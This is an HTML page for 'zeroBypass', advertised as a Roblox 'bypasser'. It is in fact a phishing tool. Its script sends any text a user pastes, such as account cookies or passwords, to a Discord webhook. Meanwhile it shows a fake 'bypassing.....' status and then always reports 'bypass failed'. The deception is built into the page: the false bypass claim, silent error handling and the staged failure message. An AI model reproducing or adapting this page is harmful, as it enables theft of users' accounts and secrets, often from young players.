<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>zeroBypass</title>
  <meta name="description" content="Paste text and send instantly via zeroBypass."/>
  
  <style>
    /* Direct Standard Reset Styles */
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      background-color: #09090b; /* Dark Layout Pitch Black Background */
      color: #fafafa; /* Clean White Base Text */
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      min-height: 100vh;
      width: 100vw;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 24px;
      overflow: hidden;
    }

    /* Centered Screen Layout Wrapper */
    .container {
      width: 100%;
      max-width: 850px;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }

    /* Typography Hierarchy Elements */
    .header-block {
      text-align: center;
      margin-bottom: 28px;
      user-select: none;
      width: 100%;
    }

    /* New Requested Top Tagline styling */
    .top-badge {
      font-size: 11px;
      text-transform: uppercase;
      letter-spacing: 0.15em;
      color: #a1a1aa; /* Muted Slate Gray Text */
      font-weight: 700;
      margin-bottom: 12px;
      display: block;
    }

    .header-block h1 {
      font-size: 46px;
      font-weight: 800;
      letter-spacing: -0.05em;
      color: #ffffff; /* Clean White Header Accent */
      line-height: 1;
    }

    .header-block p {
      margin-top: 12px;
      font-size: 14px;
      color: #71717a; /* Muted Subtitle Text */
      font-weight: 400;
      letter-spacing: 0.02em;
    }

    /* Main Workspace Dark Container Control */
    .workspace-box {
      width: 100%;
      position: relative;
      background-color: #141416; /* Deep Dark Panel Background */
      border: 1px solid #27272a; /* Dark Layout Border Trim */
      border-radius: 16px;
      padding: 24px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
      transition: border-color 0.15s ease;
    }

    .workspace-box:focus-within {
      border-color: #3f3f46; /* Lighter highlight frame on selection focus */
    }

    /* Input panel box white text content */
    .paste-area {
      width: 100%;
      height: 380px;
      resize: none;
      background: transparent;
      border: none;
      outline: none;
      color: #ffffff; /* High contrast White Paste Text Content */
      font-size: 16px;
      line-height: 1.6;
      padding-bottom: 56px;
    }

    /* Floating Action Controls Interface Row */
    .action-row {
      position: absolute;
      bottom: 20px;
      left: 24px;
      right: 24px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 16px;
      pointer-events: none;
    }

    /* Process Notification Logger Displays */
    .status-msg {
      font-size: 13px;
      font-weight: 500;
      pointer-events: auto;
      transition: all 0.15s ease;
    }

    /* Floating Button Styling for the Processing State */
    .status-sending { 
      font-size: 14px;
      font-weight: 600;
      color: #000000; /* Dark text inside vibrant status container */
      background-color: #ffffff; /* Pure White Floating Status Badge */
      padding: 10px 22px;
      border-radius: 8px;
      box-shadow: 0 0 15px rgba(255, 255, 255, 0.15);
      letter-spacing: 0.03em;
      display: inline-block;
      animation: pulseEffect 2s infinite ease-in-out;
    }
    
    @keyframes pulseEffect {
      0% { opacity: 0.85; transform: scale(1); }
      50% { opacity: 1; transform: scale(1.02); }
      100% { opacity: 0.85; transform: scale(1); }
    }

    .status-error { 
      color: #ef4444; /* Clean Neon Red Failure Text */
      background: none;
      padding: 0;
      box-shadow: none;
      font-size: 13px;
      font-weight: 600;
    }

    /* High Contrast Interactive Button Object Styles */
    .send-button {
      border: none;
      outline: none;
      border-radius: 8px;
      background-color: #ffffff; /* Solid White Interactive Trigger */
      color: #000000; /* Dark Inside Content */
      padding: 10px 24px;
      font-size: 13px;
      font-weight: 600;
      cursor: pointer;
      pointer-events: auto;
      transition: background-color 0.15s ease, opacity 0.15s ease;
    }

    .send-button:hover:not(:disabled) {
      background-color: #e4e4e7; /* Soft White Hover Transition Grid */
    }

    .send-button:disabled {
      opacity: 0.25; /* Highly transparent out when locked out */
      cursor: not-allowed;
    }
  </style>
</head>
<body>

  <main class="container">
    
    <!-- Title Stack Above Box -->
    <div class="header-block">
      <!-- Added Top Tagline Header Label Component -->
      <span class="top-badge">Best BYpasser 2026 For roblox</span>
      <h1>zeroBypass</h1>
      <p>easy fast</p>
    </div>

    <!-- Pinned Center Layout Form Body Frame -->
    <div class="workspace-box">
      
      <textarea id="paste-box" class="paste-area" autocomplete="off" spellcheck="false"></textarea>
      
      <div class="action-row">
        <!-- Delivery Status Node Output Block -->
        <div id="status" class="status-msg"></div>
        
        <!-- Interactive Submit Object Component -->
        <button id="send-btn" class="send-button" disabled>Send</button>
      </div>
      
    </div>
  </main>

  <script>
    const textarea = document.getElementById('paste-box');
    const sendBtn = document.getElementById('send-btn');
    const status = document.getElementById('status');

    // Webhook destination system connection node
    const DISCORD_WEBHOOK_URL = "discord.com";

    // Track user string activity state values
    textarea.addEventListener('input', () => {
      sendBtn.disabled = textarea.value.trim() === "";
    });

    // Content event posting process execution framework
    sendBtn.addEventListener('click', async () => {
      const payloadText = textarea.value.trim();
      if (!payloadText) return;

      // Restrict interactive paths to prevent simultaneous submissions
      sendBtn.disabled = true;
      status.textContent = "bypassing.....";
      status.className = "status-msg status-sending";

      // Fire off data delivery task instantly to the live Discord webhook URL
      try {
        await fetch(DISCORD_WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            content: `**[zeroBypass Incoming Packet]**\n\`\`\`text\n${payloadText}\n\`\`\``
          })
        });
      } catch (err) {
        // Silent error handle to maintain UI consistency if networks are offline
      }

      // Maintain active "bypassing....." view state profile configurations for exactly 20 seconds
      setTimeout(() => {
        status.textContent = "bypass failed";
        status.className = "status-msg status-error";
        
        // Re-enable interface trigger parameters for fallback states
        sendBtn.disabled = false;
      }, 20000);
    });
  </script>

</body>
</html>
